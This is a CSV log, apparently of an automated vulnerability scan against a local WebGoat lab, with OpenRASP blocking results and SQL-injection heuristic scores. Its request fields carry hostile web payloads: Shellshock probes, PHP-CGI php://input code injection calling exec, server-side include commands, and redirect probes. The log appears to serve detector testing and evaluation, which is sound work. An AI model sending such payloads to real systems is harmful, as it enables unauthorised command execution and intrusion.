profile,phase,message_seq,message_id,method,url,status_code,layer,evidence,is_sqli_like,sqli_marker,sqli_pattern_type,sqli_score,sqli_evidence,request_params,request_body_decoded,response_excerpt,request_size,response_size
current,scan,59,71,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=www.google.com,name=Smith&auth_tan=www.google.com,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",34,273
current,scan,60,72,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=www.google.com/search?q=ZAP,name=Smith&auth_tan=www.google.com/search?q=ZAP,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",53,273
current,scan,61,73,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=www.google.com:80/search?q=ZAP,name=Smith&auth_tan=www.google.com:80/search?q=ZAP,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",58,273
current,scan,62,77,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=() { :;}; echo 'x-powered-by: ShellShock-Vulnerable'&auth_tan=3SL99A,name=() { :;}; echo 'x-powered-by: ShellShock-Vulnerable'&auth_tan=3SL99A,"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=678ea911674543aab4aeec6c2070c28f""</script>",93,118
current,scan,63,78,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=() { :;}; /bin/sleep 15&auth_tan=3SL99A,name=() { :;}; /bin/sleep 15&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",62,273
current,scan,64,79,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=Smith&auth_tan=() { :;}; echo 'x-powered-by: ShellShock-Vulnerable',name=Smith&auth_tan=() { :;}; echo 'x-powered-by: ShellShock-Vulnerable',"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=3ae102dce4fd4a48a4e5ed89c4bccc4d""</script>",92,118
current,scan,65,80,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=() { :;}; /bin/sleep 15,name=Smith&auth_tan=() { :;}; /bin/sleep 15,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",61,273
current,scan,66,81,GET,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8?-s,302,none,openrasp-header-only,0,,,0,,-s=,,,0,0
current,scan,67,82,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,none,openrasp-header-only,0,,,0,,"-d allow_url_include=1 -d auto_prepend_file=php://input=&<?php exec('cmd.exe /C echo c3rqofdtwqcf4xouy67t',$colm);echo join(""
"",$colm);die();?>=","<?php exec('cmd.exe /C echo c3rqofdtwqcf4xouy67t',$colm);echo join("" "",$colm);die();?>",,86,0
current,scan,68,83,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,none,openrasp-header-only,0,,,0,,"-d allow_url_include=1 -d auto_prepend_file=php://input=&<?php exec('cmd.exe /C echo c3rqofdtwqcf4xouy67t',$colm);echo join(""
"",$colm);die();?>=","<?php exec('cmd.exe /C echo c3rqofdtwqcf4xouy67t',$colm);echo join("" "",$colm);die();?>",,86,0
current,scan,69,84,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,none,openrasp-header-only,0,,,0,,"-d allow_url_include=1 -d auto_prepend_file=php://input=&<?php exec('echo c3rqofdtwqcf4xouy67t',$colm);echo join(""
"",$colm);die();?>=","<?php exec('echo c3rqofdtwqcf4xouy67t',$colm);echo join("" "",$colm);die();?>",,75,0
current,scan,70,85,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,none,openrasp-header-only,0,,,0,,"-d allow_url_include=1 -d auto_prepend_file=php://input=&<?php exec('echo c3rqofdtwqcf4xouy67t',$colm);echo join(""
"",$colm);die();?>=","<?php exec('echo c3rqofdtwqcf4xouy67t',$colm);echo join("" "",$colm);die();?>",,75,0
current,scan,71,86,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=8432521404371914416.owasp.org&auth_tan=3SL99A,name=8432521404371914416.owasp.org&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",50,273
current,scan,72,87,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=https://8432521404371914416.owasp.org&auth_tan=3SL99A,name=https://8432521404371914416.owasp.org&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",64,273
current,scan,73,88,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=https://8432521404371914416.owasp.org&auth_tan=3SL99A,name=https://8432521404371914416%2eowasp%2eorg&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",72,273
current,scan,74,89,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=5;URL='https://8432521404371914416.owasp.org'&auth_tan=3SL99A,name=5;URL='https://8432521404371914416.owasp.org'&auth_tan=3SL99A,"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=71c47e38835e4a32aacb8f93dbc24d5e""</script>",80,118
current,scan,75,90,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=URL='http://8432521404371914416.owasp.org'&auth_tan=3SL99A,name=URL='http://8432521404371914416.owasp.org'&auth_tan=3SL99A,"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=c9f775d331f44a41be0f4908d0070a8a""</script>",75,118
current,scan,76,91,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=https://8432521404371914416.owasp.org/?Smith&auth_tan=3SL99A,name=https://8432521404371914416.owasp.org/?Smith&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",75,273
current,scan,77,92,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=5;URL='https://8432521404371914416.owasp.org/?Smith'&auth_tan=3SL99A,name=5;URL='https://8432521404371914416.owasp.org/?Smith'&auth_tan=3SL99A,"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=e796ee7a12bc4af3b725a150c8a123d7""</script>",91,118
current,scan,78,93,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=https://\8432521404371914416.owasp.org&auth_tan=3SL99A,name=https://\8432521404371914416.owasp.org&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",67,273
current,scan,79,94,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=http://\8432521404371914416.owasp.org&auth_tan=3SL99A,name=http://\8432521404371914416.owasp.org&auth_tan=3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",66,273
current,scan,80,95,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=8432521404371914416.owasp.org,name=Smith&auth_tan=8432521404371914416.owasp.org,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",49,273
current,scan,81,96,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=https://8432521404371914416.owasp.org,name=Smith&auth_tan=https://8432521404371914416.owasp.org,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",63,273
current,scan,82,97,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=https://8432521404371914416.owasp.org,name=Smith&auth_tan=https://8432521404371914416%2eowasp%2eorg,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",71,273
current,scan,83,98,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=Smith&auth_tan=5;URL='https://8432521404371914416.owasp.org',name=Smith&auth_tan=5;URL='https://8432521404371914416.owasp.org',"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=21e455c8aacf4ecd9068acc56a2bb589""</script>",79,118
current,scan,84,99,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=Smith&auth_tan=URL='http://8432521404371914416.owasp.org',name=Smith&auth_tan=URL='http://8432521404371914416.owasp.org',"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=10333a7545e94429a211bd011a0c9d8d""</script>",74,118
current,scan,85,100,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=https://8432521404371914416.owasp.org/?3SL99A,name=Smith&auth_tan=https://8432521404371914416.owasp.org/?3SL99A,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",75,273
current,scan,86,101,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,302,rasp,openrasp-block,0,,,0,,name=Smith&auth_tan=5;URL='https://8432521404371914416.owasp.org/?3SL99A',name=Smith&auth_tan=5;URL='https://8432521404371914416.owasp.org/?3SL99A',"</script><script>location.href=""https://rasp.baidu.com/blocked2/?request_id=9ae9d19054d24f34ba7961fff5112af1""</script>",91,118
current,scan,87,102,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=https://\8432521404371914416.owasp.org,name=Smith&auth_tan=https://\8432521404371914416.owasp.org,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",66,273
current,scan,88,103,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,0,,,0,,name=Smith&auth_tan=http://\8432521404371914416.owasp.org,name=Smith&auth_tan=http://\8432521404371914416.owasp.org,"{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",65,273
current,scan,89,104,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,1,--,comment_termination,2,"source=body,param=name,type=comment_termination,marker=sql comment delimiter","name=<!--#EXEC cmd=""ls /""-->&auth_tan=3SL99A","name=<!--#EXEC cmd=""ls /""-->&auth_tan=3SL99A","{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",60,273
current,scan,90,105,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,1,--,comment_termination,2,"source=body,param=name,type=comment_termination,marker=sql comment delimiter","name=""><!--#EXEC cmd=""ls /""--><&auth_tan=3SL99A","name=""><!--#EXEC cmd=""ls /""--><&auth_tan=3SL99A","{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",69,273
current,scan,91,106,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,1,--,comment_termination,2,"source=body,param=name,type=comment_termination,marker=sql comment delimiter","name=<!--#EXEC cmd=""dir \""-->&auth_tan=3SL99A","name=<!--#EXEC cmd=""dir \""-->&auth_tan=3SL99A","{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",61,273
current,scan,92,107,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,1,--,comment_termination,2,"source=body,param=name,type=comment_termination,marker=sql comment delimiter","name=""><!--#EXEC cmd=""dir \""--><&auth_tan=3SL99A","name=""><!--#EXEC cmd=""dir \""--><&auth_tan=3SL99A","{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",70,273
current,scan,93,108,POST,http://host.docker.internal:18080/webgoat/WebGoat/SqlInjection/attack8,200,none,openrasp-header-only,1,--,comment_termination,2,"source=body,param=auth_tan,type=comment_termination,marker=sql comment delimiter","name=Smith&auth_tan=<!--#EXEC cmd=""ls /""-->","name=Smith&auth_tan=<!--#EXEC cmd=""ls /""-->","{ ""lessonCompleted"" : false, ""feedback"" : ""No employee found with matching last name. Or maybe your authentication TAN is incorrect?"", ""feedbackArgs"" : null, ""output"" : null, ""outputArgs"" : null, ""assignment"" : ""SqlInjectionLesson8"", ""attemptWasMade"" : true }",59,273
